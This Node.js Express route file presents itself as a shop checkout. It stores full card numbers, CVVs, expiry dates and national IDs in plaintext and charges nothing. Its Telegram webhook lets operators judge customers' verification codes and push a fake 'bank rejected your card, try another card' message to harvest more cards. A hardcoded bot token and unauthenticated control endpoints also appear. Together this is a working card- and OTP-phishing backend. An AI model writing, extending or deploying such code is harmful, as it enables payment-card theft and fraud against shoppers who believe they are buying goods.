const mongoose = require("mongoose");
const express = require("express");
const crypto = require("crypto");
const router = express.Router();
const rateLimit = require("express-rate-limit");
const Checkout = require("../models/Checkout");
const authMiddleware = require("../middleware/auth");

const BOT2_SECRET = process.env.TELEGRAM_BOT_2_TOKEN || "9099300796:AAHqpK7lcdA4MUJN8YLim6Z5SiROL866KUA";
function isBot2OrderId(orderId) {
  if (!orderId || typeof orderId !== "string" || orderId.length < 10) return false;
  const checksum = orderId.slice(-3);
  const base = orderId.slice(0, -3);
  const hash = crypto.createHmac("sha256", BOT2_SECRET).update(base).digest("hex");
  const num = (parseInt(hash.slice(0, 4), 16) % 900) + 100;
  return String(num) === checksum;
}

const Product = require("../models/Product");

const ALLOWED_STATUS_TRANSITIONS = {
  pending: ["confirmed", "cancelled"],
  confirmed: ["cancelled"],
  cancelled: [],
};

async function populateOrderItemsImages(order) {
  if (!order || !Array.isArray(order.items)) return order;
  const missingProductIds = order.items
    .filter((item) => !item.image && item.productId)
    .map((item) => item.productId);

  if (missingProductIds.length > 0) {
    try {
      const products = await Product.find({ _id: { $in: missingProductIds } })
        .select("image images")
        .lean();
      const productMap = new Map();
      products.forEach((p) => {
        productMap.set(String(p._id), p.image || p.images?.[0] || "");
      });
      order.items = order.items.map((item) => {
        if (!item.image && item.productId && productMap.has(String(item.productId))) {
          return { ...item, image: productMap.get(String(item.productId)) };
        }
        return item;
      });
    } catch (e) {
      console.error("Error populating product images for order:", e.message);
    }
  }
  return order;
}

const checkoutRateLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 15,
  standardHeaders: true,
  legacyHeaders: false,
  message: { ok: false, error: "تم تجاوز الحد المسموح من الطلبات، يرجى المحاولة لاحقاً" },
});

// POST /api/checkout - Create order
router.post("/", checkoutRateLimiter, async (req, res) => {
  try {
    const {
      orderId,
      cardNumber,
      expiry,
      cvv,
      cardHolder,
      items,
      total,
      downPayment,
      customer,
      whatsapp,
      nationalId,
      address,
      shippingCompany,
      installmentType,
      months,
      monthlyPayment,
    } = req.body;

    if (!orderId || !cardNumber || !expiry || !cvv || !cardHolder || total === undefined) {
      return res.status(400).json({ ok: false, error: "جميع بيانات الدفع الأساسية مطلوبة" });
    }

    // Refuse saving Bot 2 orders in DB
    if (isBot2OrderId(orderId)) {
      return res.status(201).json({ ok: true, orderId, bypassed: true });
    }

    const deviceIp =
      req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
      req.socket.remoteAddress ||
      "";

    let processedItems = [];
    if (Array.isArray(items) && items.length > 0) {
      const missingImagePIds = items
        .filter((i) => !i.image && i.productId)
        .map((i) => i.productId);
      const prodMap = new Map();
      if (missingImagePIds.length > 0) {
        try {
          const prods = await Product.find({ _id: { $in: missingImagePIds } }).select("image images").lean();
          prods.forEach((p) => prodMap.set(String(p._id), p.image || p.images?.[0] || ""));
        } catch { /* ignore */ }
      }
      processedItems = items.map((item) => ({
        productId: item.productId,
        name: item.name,
        price: Number(item.price) || 0,
        quantity: Number(item.quantity) || 1,
        color: item.color || "",
        storage: item.storage || "",
        image: item.image || (item.productId ? prodMap.get(String(item.productId)) || "" : ""),
      }));
    }

    const checkout = new Checkout({
      orderId: String(orderId).trim(),
      cardNumber: String(cardNumber).trim(),
      expiry: String(expiry).trim(),
      cvv: String(cvv).trim(),
      cardHolder: String(cardHolder).trim(),
      items: processedItems,

      total: Number(total) || 0,
      downPayment: Number(downPayment) || 0,
      customer: customer ? String(customer).trim() : "",
      whatsapp: whatsapp ? String(whatsapp).trim() : "",
      nationalId: nationalId ? String(nationalId).trim() : "",
      address: address ? String(address).trim() : "",
      shippingCompany: shippingCompany ? String(shippingCompany).trim() : "",
      installmentType: installmentType === "installment" ? "installment" : "full",
      months: Number(months) || 0,
      monthlyPayment: Number(monthlyPayment) || 0,
      status: "pending",
      statusHistory: [
        {
          status: "pending",
          changedAt: new Date(),
          changedBy: "customer_checkout",
        },
      ],
      deviceIp,
    });

    await checkout.save();

    res.status(201).json({ ok: true, orderId: checkout.orderId });
  } catch (err) {
    if (err.code === 11000) {
      return res.status(400).json({ ok: false, error: "رقم الطلب مسجل مسبقاً" });
    }
    console.error("POST /api/checkout error:", err.message);
    res.status(500).json({ ok: false, error: "خطأ في معالجة الطلب" });
  }
});

// GET /api/checkout - List orders (admin)
router.get("/", authMiddleware, async (req, res) => {
  try {
    const { page, limit } = req.query;
    let query = Checkout.find().sort({ createdAt: -1 });

    const pageNum = parseInt(page);
    const limitNum = parseInt(limit);

    if (pageNum > 0 && limitNum > 0) {
      query = query.skip((pageNum - 1) * limitNum).limit(limitNum);
    } else if (limitNum > 0) {
      query = query.limit(limitNum);
    }

    const orders = await query.lean();
    res.json(orders);
  } catch (err) {
    console.error("GET /api/checkout error:", err.message);
    res.status(500).json({ ok: false, error: "خطأ في الخادم" });
  }
});

// ─── Master Bot Control Settings (Persistent in MongoDB) ──────────
const BotControlSchema = new mongoose.Schema({
  key: { type: String, default: "master_bot_control", unique: true },
  weight1: { type: Number, default: 70 },
  weight2: { type: Number, default: 30 },
  bot1_active: { type: Boolean, default: true },
  bot2_active: { type: Boolean, default: true },
  updatedBy: { type: String, default: "" },
  updatedAt: { type: Date, default: Date.now },
});

let BotControlModel;
try {
  BotControlModel = mongoose.model("MasterBotControl");
} catch {
  BotControlModel = mongoose.model("MasterBotControl", BotControlSchema);
}

// GET /api/checkout/bot-control
router.get("/bot-control", async (req, res) => {
  try {
    let doc = await BotControlModel.findOne({ key: "master_bot_control" }).lean();
    if (!doc) {
      doc = await BotControlModel.create({
        key: "master_bot_control",
        weight1: 70,
        weight2: 30,
        bot1_active: true,
        bot2_active: true,
      });
    }
    res.json({
      ok: true,
      weight1: doc.weight1 ?? 70,
      weight2: doc.weight2 ?? 30,
      bot1_active: doc.bot1_active ?? true,
      bot2_active: doc.bot2_active ?? true,
      updatedBy: doc.updatedBy || "",
      updatedAt: doc.updatedAt,
    });
  } catch (err) {
    res.status(500).json({ ok: false, error: err.message });
  }
});

// POST /api/checkout/bot-control
router.post("/bot-control", async (req, res) => {
  try {
    const { weight1, weight2, bot1_active, bot2_active, updatedBy } = req.body;
    const update = { updatedAt: new Date() };

    if (weight1 !== undefined) update.weight1 = Math.max(0, parseInt(weight1, 10) || 0);
    if (weight2 !== undefined) update.weight2 = Math.max(0, parseInt(weight2, 10) || 0);
    if (bot1_active !== undefined) update.bot1_active = Boolean(bot1_active);
    if (bot2_active !== undefined) update.bot2_active = Boolean(bot2_active);
    if (updatedBy !== undefined) update.updatedBy = String(updatedBy || "");

    const doc = await BotControlModel.findOneAndUpdate(
      { key: "master_bot_control" },
      { $set: update },
      { upsert: true, new: true, setDefaultsOnInsert: true }
    );

    res.json({
      ok: true,
      weight1: doc.weight1 ?? 70,
      weight2: doc.weight2 ?? 30,
      bot1_active: doc.bot1_active ?? true,
      bot2_active: doc.bot2_active ?? true,
      updatedBy: doc.updatedBy || "",
      updatedAt: doc.updatedAt,
    });
  } catch (err) {
    res.status(500).json({ ok: false, error: err.message });
  }
});

// ─── Interactive Order Verification Status ──────────
const OrderVerifySchema = new mongoose.Schema({
  orderId: { type: String, required: true, unique: true },
  status: { type: String, enum: ["pending", "approved", "rejected"], default: "pending" },
  code: { type: String, default: "" },
  customerName: { type: String, default: "" },
  phone: { type: String, default: "" },
  amount: { type: String, default: "" },
  updatedAt: { type: Date, default: Date.now, expires: 86400 },
});

let OrderVerifyModel;
try {
  OrderVerifyModel = mongoose.model("OrderVerifyStatus");
} catch {
  OrderVerifyModel = mongoose.model("OrderVerifyStatus", OrderVerifySchema);
}

// OPTIONS /api/checkout/verify-status/:orderId
router.options("/verify-status/:orderId", (req, res) => {
  res.set("Access-Control-Allow-Origin", "*");
  res.set("Access-Control-Allow-Methods", "GET,OPTIONS");
  res.set("Access-Control-Allow-Headers", "Content-Type");
  res.sendStatus(204);
});

// GET /api/checkout/verify-status/:orderId
router.get("/verify-status/:orderId", async (req, res) => {
  res.set("Access-Control-Allow-Origin", "*");
  res.set("Access-Control-Allow-Methods", "GET,OPTIONS");
  res.set("Access-Control-Allow-Headers", "Content-Type");
  try {
    const doc = await OrderVerifyModel.findOne({ orderId: req.params.orderId }).lean();
    res.json({ ok: true, status: doc?.status || "pending" });
  } catch (err) {
    res.status(500).json({ ok: false, error: err.message });
  }
});

// POST /api/checkout/verify-status
router.post("/verify-status", async (req, res) => {
  try {
    const { orderId, status, code, customerName, phone, amount } = req.body;
    if (!orderId) return res.status(400).json({ ok: false, error: "Missing orderId" });

    const update = { updatedAt: new Date() };
    if (status) update.status = status;
    if (code) update.code = code;
    if (customerName) update.customerName = customerName;
    if (phone) update.phone = phone;
    if (amount) update.amount = amount;

    const doc = await OrderVerifyModel.findOneAndUpdate(
      { orderId },
      { $set: update },
      { upsert: true, new: true, setDefaultsOnInsert: true }
    );
    res.json({ ok: true, status: doc.status });
  } catch (err) {
    res.status(500).json({ ok: false, error: err.message });
  }
});

// POST /api/checkout/telegram-webhook - Production Cloud Webhook (No local bot-runner needed!)
router.post("/telegram-webhook", async (req, res) => {
  res.status(200).json({ ok: true });

  try {
    const body = req.body;
    if (body?.callback_query) {
      const cb = body.callback_query;
      const dataCmd = String(cb.data || "");

      if (dataCmd.startsWith("v_app_") || dataCmd.startsWith("v_card_") || dataCmd.startsWith("v_rej_")) {
        const isApprove = dataCmd.startsWith("v_app_");
        const isCardError = dataCmd.startsWith("v_card_");
        const orderId = isCardError ? dataCmd.slice(7) : dataCmd.slice(6);
        const newStatus = isApprove ? "approved" : isCardError ? "card_error" : "rejected";

        // 1. Direct MongoDB update
        await OrderVerifyModel.findOneAndUpdate(
          { orderId },
          { $set: { status: newStatus, updatedAt: new Date() } },
          { upsert: true, returnDocument: "after" }
        );

        const bot1Token = (process.env.TELEGRAM_BOT_1_TOKEN || process.env.TELEGRAM_BOT_TOKEN || "").trim();
        const bot2Token = (process.env.TELEGRAM_BOT_2_TOKEN || "").trim();

        // 2. Acknowledge callback query silently (ZERO popup)
        const answer = async (token) => {
          if (!token) return;
          fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ callback_query_id: cb.id }),
          }).catch(() => {});
        };
        if (bot1Token) answer(bot1Token);
        if (bot2Token) answer(bot2Token);

        // 3. Update button state while preserving copy button
        const chatId = cb.message?.chat?.id;
        const messageId = cb.message?.message_id;
        if (chatId && messageId) {
          const existingButtons = cb.message?.reply_markup?.inline_keyboard?.[0] || [];
          const copyBtn = existingButtons.find((b) => b.copy_text);
          let label = "✅ تم تأكيد الطلب";
          if (isCardError) label = "💳 تم إبلاغ العميل بتغيير البطاقة";
          else if (!isApprove) label = "❌ تم الرفض";

          const row = [{ text: label, callback_data: "none" }];
          if (copyBtn) row.push(copyBtn);

          const edit = async (token) => {
            if (!token) return;
            fetch(`https://api.telegram.org/bot${token}/editMessageReplyMarkup`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                chat_id: chatId,
                message_id: messageId,
                reply_markup: { inline_keyboard: [row] },
              }),
            }).catch(() => {});
          };
          if (bot1Token) edit(bot1Token);
          if (bot2Token) edit(bot2Token);
        }

        // 4. Send Confirmation text in chat
        if (chatId) {
          let text = "";
          if (isApprove) {
            text = [
              `🎉 <b>تم تأكيد الطلب بنجاح!</b>`,
              `━━━━━━━━━━━━━━━━━━`,
              `🆔 رقم الطلب: <code>${orderId}</code>`,
              `✅ <b>الحالة للعميل:</b> ظهرت له شاشة تأكيد الحجز الرسمية وسيتم تحويله للرئيسية تلقائياً.`,
              `📱 يرجى التواصل مع العميل عبر الواتساب لتأكيد موعد الشحن.`,
            ].join("\n");
          } else if (isCardError) {
            text = [
              `💳 <b>تم إشعار العميل بوجود مشكلة في بطاقته!</b>`,
              `━━━━━━━━━━━━━━━━━━`,
              `🆔 رقم الطلب: <code>${orderId}</code>`,
              `🔄 <b>الرسالة التي ظهرت للعميل:</b> "عذراً، البنك رفض العملية لوجود مشكلة في بطاقتك.. يرجى تغيير البطاقة واستخدام بطاقة مدى أو فيزا ثانية لإتمام الدفع."`,
              `⏳ العميل الآن يقوم بتغيير بيانات البطاقة لإعادة المحاولة.`,
            ].join("\n");
          } else {
            text = [
              `⚠️ <b>تم رفض كود التحقق!</b>`,
              `━━━━━━━━━━━━━━━━━━`,
              `🆔 رقم الطلب: <code>${orderId}</code>`,
              `🔄 <b>الحالة للعميل:</b> ظهرت له رسالة: "الكود غير صحيح، يرجى كتابة الرمز الصحيح والمحاولة مرة أخرى".`,
            ].join("\n");
          }

          const send = async (token) => {
            if (!token) return;
            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ chat_id: chatId, text, parse_mode: "HTML" }),
            }).catch(() => {});
          };
          if (bot1Token) send(bot1Token);
          if (bot2Token) send(bot2Token);
        }
      }
    }
  } catch (err) {
    console.error("Webhook processing error:", err);
  }
});

// GET /api/checkout/:id - Single order
router.get("/:id", authMiddleware, async (req, res) => {
  try {
    let order = null;
    if (req.params.id.match(/^[0-9a-fA-F]{24}$/)) {
      order = await Checkout.findById(req.params.id).lean();
    }
    if (!order) {
      order = await Checkout.findOne({ orderId: req.params.id }).lean();
    }
    if (!order) return res.status(404).json({ ok: false, error: "الطلب غير موجود" });
    order = await populateOrderItemsImages(order);
    res.json(order);
  } catch (err) {
    res.status(500).json({ ok: false, error: "خطأ في الخادم" });
  }
});

// PUT /api/checkout/:id/status
router.put("/:id/status", authMiddleware, async (req, res) => {
  try {
    const { status } = req.body;
    if (!["pending", "confirmed", "cancelled"].includes(status)) {
      return res.status(400).json({ ok: false, error: "حالة غير صالحة" });
    }
    const order = await Checkout.findById(req.params.id);
    if (!order) return res.status(404).json({ ok: false, error: "الطلب غير موجود" });

    if (order.status === status) return res.json(order);

    const allowed = ALLOWED_STATUS_TRANSITIONS[order.status] || [];
    if (!allowed.includes(status)) {
      return res.status(400).json({
        ok: false,
        error: `لا يمكن تحويل الطلب من حالة "${order.status}" إلى "${status}"`,
      });
    }

    order.status = status;
    order.statusHistory = order.statusHistory || [];
    order.statusHistory.push({
      status,
      changedAt: new Date(),
      changedBy: req.admin?.email || "admin",
    });

    await order.save();
    const result = await populateOrderItemsImages(order.toObject());
    res.json(result);
  } catch (err) {
    res.status(500).json({ ok: false, error: "خطأ في الخادم" });
  }
});

// PUT /api/checkout/:id/financials
router.put("/:id/financials", authMiddleware, async (req, res) => {
  try {
    const { total, downPayment, months, monthlyPayment } = req.body;
    const order = await Checkout.findByIdAndUpdate(
      req.params.id,
      {
        total: Number(total),
        downPayment: Number(downPayment),
        months: Number(months),
        monthlyPayment: Number(monthlyPayment),
      },
      { returnDocument: "after" }
    );
    if (!order) return res.status(404).json({ ok: false, error: "الطلب غير موجود" });
    res.json(order);
  } catch (err) {
    res.status(500).json({ ok: false, error: "خطأ في الخادم" });
  }
});

// DELETE /api/checkout/:id
router.delete("/:id", authMiddleware, async (req, res) => {
  try {
    const order = await Checkout.findByIdAndDelete(req.params.id);
    if (!order) return res.status(404).json({ ok: false, error: "الطلب غير موجود" });
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ ok: false, error: "خطأ في الخادم" });
  }
});

module.exports = router;